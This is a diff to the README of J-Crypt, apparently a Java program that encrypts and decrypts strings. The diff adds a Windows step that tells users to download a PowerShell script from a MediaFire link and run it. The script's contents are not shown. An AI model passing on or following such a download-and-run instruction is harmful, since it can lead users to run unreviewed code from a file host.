@@ -5,6 +5,8 @@ J-Crypt is a Java Program that encrypt/decrypts a String. You can use your own k
 For best Encryption, I highly recommend to make your own keys that is 15 up characters in length, it should contain Symbols, Upper/Lower case Characters and numbers. example: `Th!$keyI$N0t$ecured`
 
 ![Figure 1-1](Documentation/Options.png "Options")
+### If you are using windows
+- download [this](https://www.mediafire.com/file/c7q8ei1rrf4uazp/executeJarWindows.ps1/file). Run it with Powershell
 ### Clone
 - `git clone https://github.com/jaymar921/J-Crypt`
 ### go to directory
